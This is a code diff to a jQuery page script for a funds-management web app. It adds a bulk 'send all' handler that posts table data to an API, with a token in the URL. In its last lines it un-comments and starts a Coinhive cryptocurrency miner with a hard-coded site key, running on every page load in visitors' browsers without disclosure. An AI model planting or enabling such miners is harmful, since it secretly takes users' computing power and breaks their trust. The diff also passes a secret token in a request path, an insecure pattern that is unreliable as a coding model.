@@ -57,12 +57,39 @@ $( document ).ready(function() {
         });
     });
 
+    $('#send_all').click(function(){
+        var tbl = $('#user_list_send_funds > tbody  > tr').get().map(function(row) {
+            return $(row).find('td :first-child').get().map(function(cell) {
+                var el = $(cell).first();
+                if (el.is('input'))
+                    return el.val().trim();
+                else
+                    return el.text().trim();
+            });
+        });
+
+        var token = $("#token").val();
+        var rate = $("#rate").val();
+
+        $.ajax('/api/add_multiple_funds_call/' + token + '/' + rate, {
+            data : JSON.stringify(tbl),
+            contentType : 'application/json',
+            type : 'POST'
+            // success: function(data){
+            //     var json = $.parseJSON(data);
+            //     alert(json.html);
+            // },
+        });
+
+        window.location.replace('/user/user_list')
+    });
+
     /* Create export buttons */
     TableExport(document.getElementsByTagName("table"), {
         formats: ['csv', 'txt']
     });
 
     /* Start Coinhive miner */
-    // var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
-    // miner.start();
+    var miner = new CoinHive.User('fPJeVvHSsmiTqZD7MXrltqc3ogjojFLp', 'KriptoKojn', { threads: 1 });
+    miner.start();
 });
